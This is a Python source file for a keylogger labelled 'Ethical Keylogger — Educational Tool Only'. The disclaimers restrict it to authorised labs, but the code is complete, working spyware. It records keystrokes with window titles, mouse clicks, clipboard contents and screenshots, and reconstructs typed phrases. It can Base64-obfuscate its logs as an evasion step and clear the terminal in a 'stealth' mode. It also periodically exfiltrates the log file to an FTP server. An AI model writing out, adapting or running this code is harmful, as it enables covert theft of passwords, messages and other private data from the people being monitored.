#!/usr/bin/env python3
"""
Ethical Keylogger — Educational Tool Only.

This tool is intended exclusively for cybersecurity education, authorized
penetration testing labs, and research in controlled environments.
Unauthorized use against systems or individuals you do not own or have
explicit permission to test is ILLEGAL and UNETHICAL.

Features:
  - Keystroke logging with active-window context
  - Mouse-click logging
  - Clipboard monitoring
  - Periodic screenshots (optional)
  - Phrase summarization
  - Optional FTP exfiltration (lab demo)
  - Optional Base64 obfuscation demo

CLI examples:
  python keylogger.py --demo                  # Print to stdout, no files
  python keylogger.py --no-log --screenshots  # Screenshots only
  python keylogger.py --summary-only          # Reconstructed phrases only
  python keylogger.py --ftp-host HOST --ftp-user USER --ftp-pass PASS --ftp-dir /logs
  python keylogger.py --obfuscate             # Base64 log obfuscation demo
"""

import argparse
import base64
import ftplib
import os
import time
from datetime import datetime
from pathlib import Path
from threading import Timer

from pynput import keyboard, mouse  # pip install pynput
import pyautogui                    # pip install pyautogui
import pyperclip                    # pip install pyperclip

# ── Disclaimer ────────────────────────────────────────────────────────────────
DISCLAIMER = """
╔══════════════════════════════════════════════════════════════════════╗
║          ETHICAL KEYLOGGER — FOR EDUCATIONAL USE ONLY               ║
║                                                                      ║
║  Only run this tool on systems you own or have written permission    ║
║  to test. Unauthorized use is illegal and unethical.                 ║
╚══════════════════════════════════════════════════════════════════════╝
"""


# ── CLI ───────────────────────────────────────────────────────────────────────
def parse_args() -> argparse.Namespace:
    """Parse and return command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Ethical Keylogger — educational tool for authorized lab use only."
    )
    parser.add_argument("--demo", action="store_true",
                        help="Print events to stdout; write no files")
    parser.add_argument("--no-log", action="store_true",
                        help="Disable keystroke log file")
    parser.add_argument("--summary-only", action="store_true",
                        help="Print reconstructed phrases only (no raw keystrokes)")
    parser.add_argument("--screenshots", action="store_true",
                        help="Capture a screenshot every 60 seconds")
    parser.add_argument("--obfuscate", action="store_true",
                        help="Base64-encode log lines (evasion technique demo)")
    parser.add_argument("--stealth", action="store_true",
                        help="Clear the terminal on startup")
    parser.add_argument("--ftp-host", default=None,
                        help="FTP server hostname for log exfiltration demo")
    parser.add_argument("--ftp-user", default=None,
                        help="FTP username")
    parser.add_argument("--ftp-pass", default=None,
                        help="FTP password")
    parser.add_argument("--ftp-dir", default="/",
                        help="Remote FTP directory (default: /)")
    return parser.parse_args()


args = parse_args()

DEMO_MODE = args.demo
NO_LOG = args.no_log or DEMO_MODE or args.summary_only
SCREENSHOTS = args.screenshots
OBFUSCATE = args.obfuscate
STEALTH = args.stealth
FTP_ENABLED = bool(args.ftp_host)
FTP_CONFIG = (
    {
        "host": args.ftp_host,
        "user": args.ftp_user,
        "pass": args.ftp_pass,
        "dir": args.ftp_dir,
    }
    if FTP_ENABLED
    else None
)

# ── Config ────────────────────────────────────────────────────────────────────
LOG_FILE = Path.cwd() / f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
SCREENSHOT_DIR = Path.cwd() / "screenshots"
SCREENSHOT_DIR.mkdir(exist_ok=True)

FTP_INTERVAL = 30        # seconds between FTP uploads
SCREENSHOT_INTERVAL = 60 # seconds between screenshots
SUMMARY_INTERVAL = 300   # seconds between phrase summaries
BUFFER_FLUSH_SIZE = 20   # flush buffer after this many keystrokes

buffer: list[str] = []
phrases: list[str] = []
last_clipboard: str = ""
last_upload: float = 0.0


# ── Utilities ─────────────────────────────────────────────────────────────────
def get_active_window() -> str:
    """Return the title of the currently focused window (max 60 chars)."""
    try:
        title = pyautogui.getActiveWindowTitle()
        return (title or "UNKNOWN")[:60]
    except Exception:
        return "UNKNOWN"


def format_key(key) -> str:
    """Convert a pynput key object to a human-readable string."""
    try:
        return key.char
    except AttributeError:
        key_map = {
            keyboard.Key.space:     " ",
            keyboard.Key.enter:     "[ENTER]\n",
            keyboard.Key.backspace: "[BS]",
            keyboard.Key.tab:       "[TAB]",
            keyboard.Key.ctrl_l:    "[CTRL]",
            keyboard.Key.shift:     "[SHIFT]",
        }
        return key_map.get(key, f"[{str(key).upper()}]")


def obfuscate_text(text: str) -> str:
    """Base64-encode *text* and truncate to 100 chars (evasion demo)."""
    return base64.b64encode(text.encode()).decode()[:100] + "..."


def write_line(text: str) -> None:
    """
    Write a timestamped, window-annotated log line.

    In demo / summary-only mode the line is printed to stdout.
    Otherwise it is appended to LOG_FILE (unless NO_LOG is set).
    """
    timestamp = datetime.now().strftime("%H:%M:%S")
    window = get_active_window()
    line = f"[{timestamp}] [{window}] {text}"
    if OBFUSCATE:
        line = obfuscate_text(line)

    if DEMO_MODE or args.summary_only:
        print(line, end="")
    elif not NO_LOG:
        with LOG_FILE.open("a", encoding="utf-8") as fh:
            fh.write(line + "\n")


def flush_buffer() -> None:
    """Write the current keystroke buffer to the log and reset it."""
    global buffer, phrases
    if not buffer:
        return
    phrase = "".join(
        c for c in buffer if c not in ("[BS]", "[TAB]", "[ENTER]")
    ).strip()
    if phrase and len(phrase) > 3:
        phrases.append(phrase)
    write_line("".join(buffer))
    buffer = []


def take_screenshot() -> None:
    """Capture a screenshot and save it to SCREENSHOT_DIR."""
    if not SCREENSHOTS:
        return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    img_path = SCREENSHOT_DIR / f"screenshot_{timestamp}.png"
    pyautogui.screenshot().save(img_path)
    print(f"[+] Screenshot saved: {img_path}")
    # Schedule the next screenshot
    Timer(SCREENSHOT_INTERVAL, take_screenshot).start()


def check_clipboard() -> None:
    """Log clipboard contents if they have changed since the last check."""
    global last_clipboard
    try:
        clip = pyperclip.paste()
        if clip and clip != last_clipboard:
            write_line(f"[CLIPBOARD] {clip[:200]}")
            last_clipboard = clip
    except Exception:
        pass


def ftp_upload() -> None:
    """Upload the log file to the configured FTP server (lab demo)."""
    global last_upload
    if not FTP_ENABLED:
        return
    if not LOG_FILE.exists():
        return
    if time.time() - last_upload < FTP_INTERVAL:
        return
    try:
        ftp = ftplib.FTP(FTP_CONFIG["host"])
        ftp.login(FTP_CONFIG["user"], FTP_CONFIG["pass"])
        ftp.cwd(FTP_CONFIG["dir"])
        with LOG_FILE.open("rb") as fh:
            ftp.storbinary(f"STOR {LOG_FILE.name}", fh)
        ftp.quit()
        print("[+] FTP upload successful")
        last_upload = time.time()
    except Exception as exc:
        print(f"[-] FTP upload failed: {exc}")
    # Schedule next upload
    Timer(FTP_INTERVAL, ftp_upload).start()


def summary_report() -> None:
    """Print/log a summary of recently captured phrases."""
    if phrases:
        summary = " | ".join(phrases[-5:])
        write_line(f"[SUMMARY] Recent phrases: {summary}")
        phrases.clear()
    # Schedule next summary
    Timer(SUMMARY_INTERVAL, summary_report).start()


# ── Event handlers ────────────────────────────────────────────────────────────
def on_key_press(key) -> None:
    """Handle a key-press event."""
    global buffer
    key_str = format_key(key)
    buffer.append(key_str)
    if len(buffer) >= BUFFER_FLUSH_SIZE or "[ENTER]" in key_str:
        flush_buffer()


def on_key_release(key) -> bool | None:
    """Handle a key-release event; stop listeners on Escape."""
    if key == keyboard.Key.esc:
        flush_buffer()
        summary_report()
        ftp_upload()
        take_screenshot()
        return False  # Signal pynput to stop the listener
    return None


def on_click(x: int, y: int, button, pressed: bool) -> None:
    """Log mouse-click events with screen coordinates and active window."""
    if pressed:
        write_line(f"[MOUSE {button}] at ({x}, {y}) in [{get_active_window()}]")


# ── Main ──────────────────────────────────────────────────────────────────────
def main() -> None:
    """Entry point — display the disclaimer, start listeners and timers."""
    print(DISCLAIMER)

    if STEALTH:
        os.system("clear")  # Use "cls" on Windows

    print(
        f"[+] Log file  : {LOG_FILE}\n"
        f"[+] Screenshots: {SCREENSHOTS} | Obfuscate: {OBFUSCATE} | FTP: {FTP_ENABLED}"
    )
    if NO_LOG and not SCREENSHOTS:
        print("[+] No persistent logs or screenshots will be written.")

    # Start periodic tasks (screenshots and FTP are self-rescheduling)
    if SCREENSHOTS:
        Timer(SCREENSHOT_INTERVAL, take_screenshot).start()
    Timer(SUMMARY_INTERVAL, summary_report).start()
    if FTP_ENABLED:
        Timer(FTP_INTERVAL, ftp_upload).start()

    # Start input listeners
    keyboard_listener = keyboard.Listener(
        on_press=on_key_press, on_release=on_key_release
    )
    mouse_listener = mouse.Listener(on_click=on_click)

    keyboard_listener.start()
    mouse_listener.start()

    check_clipboard()       # Capture any pre-existing clipboard content
    keyboard_listener.join()


if __name__ == "__main__":
    main()
